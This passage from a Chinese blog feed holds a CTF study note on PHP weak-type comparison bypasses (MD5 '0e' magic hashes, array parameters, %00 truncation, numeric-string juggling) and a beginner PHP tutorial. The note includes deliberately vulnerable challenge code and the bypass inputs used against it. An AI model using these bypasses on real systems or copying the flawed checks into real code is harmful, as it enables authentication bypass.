class="line">0e500007361044747804682122060876</span><br><span class="line">7197546197 </span><br><span class="line">0e915188576072469101457315675502</span><br><span class="line">7656486157 </span><br><span class="line">0e451569119711843337267091732412</span><br><span class="line">QLTHNDT </span><br><span class="line">0e405967825401955372549139051580</span><br><span class="line">QNKCDZO </span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">EEIZDOI </span><br><span class="line">0e782601363539291779881938479162</span><br><span class="line">TUFEPMC </span><br><span class="line">0e839407194569345277863905212547</span><br><span class="line">UTIPEZQ </span><br><span class="line">0e382098788231234954670291303879</span><br><span class="line">UYXFLOI </span><br><span class="line">0e552539585246568817348686838809</span><br><span class="line">IHKFRNS </span><br><span class="line">0e256160682445802696926137988570</span><br><span class="line">PJNPDWY </span><br><span class="line">0e291529052894702774557631701704</span><br><span class="line">ABJIHVY </span><br><span class="line">0e755264355178451322893275696586</span><br><span class="line">DQWRASX </span><br><span class="line">0e742373665639232907775599582643</span><br><span class="line">DYAXWCA </span><br><span class="line">0e424759758842488633464374063001</span><br><span class="line">GEGHBXL </span><br><span class="line">0e248776895502908863709684713578</span><br><span class="line">GGHMVOE </span><br><span class="line">0e362766013028313274586933780773</span><br><span class="line">GZECLQZ </span><br><span class="line">0e537612333747236407713628225676</span><br><span class="line">NWWKITQ </span><br><span class="line">0e763082070976038347657360817689</span><br><span class="line">NOOPCJF </span><br><span class="line">0e818888003657176127862245791911</span><br><span class="line">MAUXXQC </span><br><span class="line">0e478478466848439040434801845361</span><br><span class="line">MMHUWUV </span><br><span class="line">0e701732711630150438129209816536</span><br></pre></td></tr></table></figure><h2 id="例题实战-3"><a href="#例题实战-3" class="headerlink" title="例题实战"></a>例题实战</h2><p><img src="https://img-blog.csdnimg.cn/20200421142732601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&#x27;username&#x27;</span>] == $_GET[<span class="string">&#x27;password&#x27;</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Your password can not be your username.&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (md5($_GET[<span class="string">&#x27;username&#x27;</span>]) === md5($_GET[<span class="string">&#x27;password&#x27;</span>]))</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Flag: &#x27;</span>.$flag);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Invalid password&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>==</code>等于，只需要等号两边的值是否相等。比如‘1’==1就成立，返回true。<br><code>===</code>全等，需要全等号两边的值和类型全都相等才成立。<br>这道题需要username和password全等但是username又不能等于password。比较矛盾，多看几遍理解还是比较容易理解的。<br>数组绕过：构造<code>?username[]=1&amp;password[]=2</code><br><img src="https://img-blog.csdnimg.cn/2020042113335981.png" alt="Augenstern" loading="lazy"></p><h1 id="数组返回NULL绕过"><a href="#数组返回NULL绕过" class="headerlink" title="数组返回NULL绕过"></a>数组返回NULL绕过</h1><h2 id="知识了解-4"><a href="#知识了解-4" class="headerlink" title="知识了解"></a>知识了解</h2><ul><li>ereg — 正则表达式匹配<br>ereg函数的漏洞：<br>①%00截断及遇到%00则默认为字符串的结束<br>②当传入的不是字符串而为一个数组时它的返回值不是FALSE，而是NULL</li><li>strpos的参数同样不能够是数组，所以返回的依旧是null，null不等于false也是正确。<h2 id="例题实战-4"><a href="#例题实战-4" class="headerlink" title="例题实战"></a>例题实战</h2><img src="https://img-blog.csdnimg.cn/20200421151507191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>[a-zA-Z0-9]<br>方括号表示字符集，[A-Za-z0-9]匹配大小写字母和数字其中一个字符<br>其他的是正则表达式。<br>看代码：<br>这个password必须以数字或者字母开头<br>并且还要在password中检测到<code>--</code>的存在<br>第一种：<br>可以考虑<code>%00</code>截断<br>构造<code>?password=a%00--</code><br>得到flag<br>第二种：<br>考虑数组<br>构造<code>?password[]=--</code><br>得到flag<br>第三种：<br>这个得到flag有点不明白，同样是数组，但是构造<code>?password[]=1</code><br>同样得到flag。看了大佬的博客知道可以这样得到flag，但是具体原因，不晓得。<br>结果：<br><img src="https://img-blog.csdnimg.cn/20200421155133939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><h1 id="弱类型整数大小比较绕过"><a href="#弱类型整数大小比较绕过" class="headerlink" title="弱类型整数大小比较绕过"></a>弱类型整数大小比较绕过</h1><h2 id="题中了解相关知识"><a href="#题中了解相关知识" class="headerlink" title="题中了解相关知识"></a>题中了解相关知识</h2><img src="https://img-blog.csdnimg.cn/20200421160437410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="来自bugku" loading="lazy"><br>代码：<br>三元运算符判断传入的是不是一个数字，是返回no mumeric(不是数字)，否返回NULL。<br>再判断传入的是否大于1336.，大于就打印flag。<br>我想的是构造<code>?password=2587abc</code><br>这样它既不是一个数字又大于1336.应该是可以打印出flag的。<br>第二种，<br>代码本来自身矛盾，但是PHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。可以通过数组绕过。<br>构造<code>?password[]=a</code>两种方法都可以得到flag<br><img src="https://img-blog.csdnimg.cn/20200421162350344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><h1 id="刷题（随便记一下）"><a href="#刷题（随便记一下）" class="headerlink" title="刷题（随便记一下）"></a>刷题（随便记一下）</h1>一、十六进制与数字比较</li></ul><p>十六进制与数字比较，参考bugku的一道题，代码还是比较简单的，代码还是有矛盾，要想办法绕过，有一点记住就行了<strong>php在转码时会把16进制转化为十进制</strong>，所以在构造payload的时候将数字转换为十六进制的就行了。<br>这个还有就是可以数组绕过，直接构造数组就可以绕过。也没什么需要注意的。</p><p>二、数字验证正则绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">&#x27;flag&#123;test&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;POST&quot;</span> == $_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>])&#123;</span><br><span class="line">$password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">&#x27;/^[[:graph:]]&#123;12,&#125;$/&#x27;</span>, $password)) <span class="comment">//preg_match — 执行一个正则表达式匹配</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">TRUE</span>)&#123;</span><br><span class="line">$reg = <span class="string">&#x27;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">$c = <span class="number">0</span>;</span><br><span class="line">$ps = <span class="keyword">array</span>(<span class="string">&#x27;punct&#x27;</span>, <span class="string">&#x27;digit&#x27;</span>, <span class="string">&#x27;upper&#x27;</span>, <span class="string">&#x27;lower&#x27;</span>); <span class="comment">//[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母</span></span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)&#123;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/[[:$pt:]]+/&quot;</span>, $password))</span><br><span class="line">$c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;<span class="comment">//&gt;=3，必须包含四种类型三种与三种以上</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;42&quot;</span> == $password) <span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">&#x27;Wrong password&#x27;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码给出，一点一点看，先看打印flag的地方，<br><img src="https://img-blog.csdnimg.cn/20200425222005483.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br><code>[:graph:]</code>是代表printable and visible的字符,是除空格符(空格键与[TAB]键)之外的所有按键,<br>控制字符不算[:graph:]<br>然后这个意思是匹配的password的长度要大于12，这里我用<code>lalalalalalala</code>，<br>然后继续看<br><img src="https://img-blog.csdnimg.cn/20200425222239924.png" alt="Augenstern" loading="lazy"><br><code>[:punct:]</code>是匹配这些特殊字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[!<span class="string">&quot;#$%&amp;&#x27;()*+, \-./:;&lt;=&gt;?@ [\\\]^_`&#123;|&#125;~]</span></span><br></pre></td></tr></table></figure><p><code>[:digit:]</code>是匹配<code>0-9</code>的数字<br><code>[:upper:]</code>是匹配大写字母<code>A-Z</code><br><code>[:lower:]</code>是匹配小写字母<code>a-z</code><br>关于正则匹配的一些知识参考<a href="https://www.cnblogs.com/Jordandan/p/11211729.html">大佬博客</a></p><p>所以这一句的意思是password里还要匹配到数字、字符、大写和小写字母。<br>我这里将上面的payload改一下<code>lalaLal4_ala</code><br>继续<br><img src="https://img-blog.csdnimg.cn/20200425223245324.png" alt="Augenstern" loading="lazy"><br>这里提示已经有了 ，必须包含四种类型三种与三种以上<br>上面的payload已经符合要求。<br><code>&quot;42&quot;==$password</code>这个是个弱类型比较数字大小，只要前两位是数字，后面的字母在进行比较时会被强行转换成数字来比较，这里相等，所以我再把payload改一下，<code>42laLal4_ala</code>就可以绕过了吧，试一下。<br>还有一点就是，题目上的请求方式是post方式，所以这里抓一下包进行修改<br><img src="https://img-blog.csdnimg.cn/20200425224347421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>得到flag<br>最后这两题原本也是要详细的写一下知识了解的，后来想想还是不写了，过于啰嗦了。 继续学习加油。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP从零开始——学习笔记(1)</title>
      <link href="/2020/08/23/PHP%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/08/23/PHP%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E2%80%94%E2%80%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP介绍"><a href="#PHP介绍" class="headerlink" title="PHP介绍"></a>PHP介绍</h1><p>PHP的强大功能：<br>1、运行在服务器端：学会了PHP，就可以指挥服务器给你干活，甚至是搞破坏^_^（千万不能真这么做咯），WEB网站的大部分数据都是存储在服务器端的，PHP就是用来处理这些存储在服务器的数据的（功能强大吧）。</p><p>2、跨平台：服务器可以是多种平台的服务器，比如Linux、Windows、Unix，你都可以指挥（不用怕只能指挥一种服务器啦吧）。</p><p>3、脚本语言：它是通过编写脚本，也就是一行行的计算机指令（也可以理解为特定的英文单词），来指挥服务器来工作的，因此，在编写PHP的过程其实就是与老外（服务器成老外啦）交流的过程，交流的语言就是PHP。</p><p>4、免费：免费使用（天下还真有免费的午餐）。</p><h2 id="开始学习"><a href="#开始学习" class="headerlink" title="开始学习"></a>开始学习</h2><p>编写PHP代码，写PHP代码很简单，就是一行简单的代码。例如下面这个样子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span><span class="string">&quot;大家一起来学习PHP！&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>还可以写成一行代码。注：单引号和双引号都可以。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;大家一起来学习PHP！&quot;</span>;<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&#x27;大家一起来学习PHP！&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果一样<br>PHP代码可以像JavaScript一样插在HTML里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;php语法&lt;/title&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">      <span class="meta">&lt;?php</span> <span class="keyword">echo</span> php代码;<span class="meta">?&gt;</span></span><br><span class="line">        &lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>但注意后面的<code>?&gt;</code>是可以省略的。<br>字符串：在PHP中可以直接通过echo输出字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hi php!&quot;</span>;<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//还可以这么连接两个字符串</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hi&quot;</span> . <span class="string">&quot;php&quot;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PHP里可以用<code>.</code>（英文输入法里的句号也就是——点）来连接两个字符串。还有上面的代码里应该看到了我的注释了，对就是双斜扛<code>//</code>这个是PHP里的注释符。<br>基础了解后就正式开始知识点</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是用于存储值的，我们命令服务器去干活的时候，往往需要产生一些数据，需要临时性存放起来，方便取用。我们也可以理解为，变量就像一个购物袋，我们可以用来装苹果、榴莲（当然也可以用来装玫瑰），需要注意的是，一般情况下一个变量只能装一个（不要太贪心）值。然后用一个代码来看看怎么定义变量的：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $var = <span class="string">&quot;欢迎来到我的博客：&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> $var;</span><br><span class="line">   $var = <span class="string">&quot;https://zxcv0221.github.io&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> $var;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出变量名需要用”美金”来标识，变量命名也是有规则的：<br><img src="https://img-blog.csdnimg.cn/20200314145633274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="摘自慕课网：自学的好地方" loading="lazy"></p><h3 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h3><h4 id="普通可变变量"><a href="#普通可变变量" class="headerlink" title="普通可变变量"></a>普通可变变量</h4><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名，就是可以使用两个美元符号，使一个变量成为一个可变变量。比如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a= <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">$$a= <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$a $&#123;$a&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;$a $hello&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>代码跑出来，打印出两个<code>hello world</code></p><h4 id="可变变量用于数组"><a href="#可变变量用于数组" class="headerlink" title="可变变量用于数组"></a>可变变量用于数组</h4><p>讲可变变量用于数组要解决一个问题，就是当写下代码<code>$$a[1]</code>的时候，解析器需要知道我们是想让<code>$a[1]</code>作为一个变量呢还是让<code>$$a</code>作为一个变量并且取出该变量中索引为[1]的值。<br>解决办法：对于第一种情况写成<code>$&#123;$a[1]&#125;</code>即可。第二种情况写成<code>$&#123;$a&#125;[1]</code></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>PHP的数据类型也分为：整型、浮点型、字符串类型、布尔类型等等不同的数据类型所占的“地盘”也不一样。可以通过这样一个函数来查看数据所占空间的大小。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> $m1 = memory_get_usage(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;<span class="comment">//这是换行符</span></span><br><span class="line">$var_string=<span class="string">&quot;123&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $m2 = memory_get_usage()-$m1; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">$n=<span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> $m3 = memory_get_usage()-$m1-$m2; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">$f=<span class="number">123.00</span>;</span><br><span class="line"><span class="keyword">echo</span> $m4 = memory_get_usage()-$m1-$m2-$m3; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314150732708.png" alt="在这里插入图片描述" loading="lazy"><br>然后第一行是初始化所消耗的内存，下面的话，就是要减去初始化所占的内存就能看出来这个数据所占的内存了。<br>输出数据类型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $string = <span class="string">&quot;就是就是&quot;</span>;</span><br><span class="line">      var_dump($string);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">      $string = <span class="number">9494</span>;</span><br><span class="line">      var_dump($string);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314152024397.png" alt="在这里插入图片描述" loading="lazy"><br>布尔类型就是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $man = <span class="string">&quot;男&quot;</span>;</span><br><span class="line">$flag = $man == <span class="string">&quot;男&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($flag);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314153408607.png" alt="在这里插入图片描述" loading="lazy"><br>判断是否满足条件的时候，是用“true”表示满足，用“false”表示不满足。注意，当用”echo”指令输出布尔类型时，如果是“true”则输出的是“1”，“false”则什么也不输出。<br>浮点型</p><ol><li>正常格式输入就可以，<br>2.输入小写e或者大写E就可以用科学计数法来<br>表示;而<code>+</code> <code>- </code> 号也不是加减<br><img src="https://img-blog.csdnimg.cn/20200314153841931.png" alt="在这里插入图片描述" loading="lazy"><br>整型：可以用八进制、十进制、十六进制指定；<br>字符串：<br>如果需要输出双引号或者单引号怎么办？有两种方法：</li><li>单引号里嵌套双引号或者双引号里嵌套单引号。</li><li>使用转义字符<code>\</code>。<br><img src="https://img-blog.csdnimg.cn/20200314154940880.png" alt="在这里插入图片描述" loading="lazy"><br>当输出时，引号遇到了<code>美元</code></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$love = <span class="string">&quot;I love you!&quot;</span>; </span><br><span class="line">$string1 = <span class="string">&quot;PHP,$love&quot;</span>;</span><br><span class="line">$string2 = <span class="string">&#x27;PHP,$love&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> $string1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $string2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200314155343449.png" alt="在这里插入图片描述" loading="lazy"><br>总结：<br>当双引号中包含变量时，变量会与双引号中的内容连接在一起；</p><p>当单引号中包含变量时，变量会被当做字符串输出。<br>输出长字符串比如一首歌或者诗。<br>首先使用定界符表示字符串（&lt;&lt;&lt;），接着在“&lt;&lt;&lt;“之后提供一个标识符GOD，然后是字符串，最后以提供的这个标识符结束字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$string1=<span class="string">&lt;&lt;&lt;GOD</span></span><br><span class="line"><span class="string">我有一只小毛驴，我从来也不骑。</span></span><br><span class="line"><span class="string">有一天我心血来潮，骑着去赶集。</span></span><br><span class="line"><span class="string">我手里拿着小皮鞭，我心里正得意。</span></span><br><span class="line"><span class="string">不知怎么哗啦啦啦啦，我摔了一身泥.</span></span><br><span class="line"><span class="string">GOD;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $string1;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>标识符可以随便用，随便一个单词或者字母都可以，保证前后保持一致就OK。结尾的一行除了标识符和<code>;</code>不能有其他的符号，空格也不行。<br>特殊类型：<br>NULL（NULL）：NULL是空类型，对大小写不敏感，NULL类型只有一个取值，表示一个变量没有值，当被赋值为NULL，或者尚未被赋值，或者被unset()，这三种情况下变量被认为为NULL。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"> error_reporting(<span class="number">0</span>); <span class="comment">//禁止显示PHP警告提示</span></span><br><span class="line"> $var;</span><br><span class="line"> var_dump($var);</span><br><span class="line"> $var1=<span class="literal">null</span>;</span><br><span class="line"> var_dump($var1);</span><br><span class="line"> $var2=<span class="literal">NULL</span>;</span><br><span class="line"> var_dump( $var2);</span><br><span class="line"> $var3 = <span class="string">&quot;节日快乐！&quot;</span>;</span><br><span class="line"> <span class="keyword">unset</span>($var3);</span><br><span class="line"> var_dump($var3);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>unset()</code>函数可以释放被赋值后的变量。释放后变量就跟没赋值一样。类型就会变成NULL。</p><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><h2 id="常量的定义"><a href="#常量的定义" class="headerlink" title="常量的定义"></a>常量的定义</h2><p>什么是常量？常量可以理解为值不变的量（如圆周率）；或者是常量值被定义后，在脚本的其他任何地方都不可以被改变。PHP中的常量分为自定义常量和系统常量。<br>自定义常量：<br>自定义常量是根据我们开发的需要，而定义的常量，它通过使用PHP中的函数define()定义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> define(<span class="keyword">string</span> $constant_name, mixed $value[, $case_sensitive = <span class="literal">true</span>])</span><br></pre></td></tr></table></figure><p>它有三个参数，第一个参数“constant_name”为必选参数，常量名称,即标志符，常量的命名规则与变量的一致，但是要注意哦，它可不带美元符号<br>第二个参数“value”为必选参数，它是常量的值。<br>第三个参数“case_sensitive”为可选参数，指定是否大小写敏感，设定为true表示不敏感，一般不指定第三个参数的情况下，默认第三个参数的值为false。如<code>define(&quot;PI&quot;,3.14);</code></p><h2 id="常量的作用："><a href="#常量的作用：" class="headerlink" 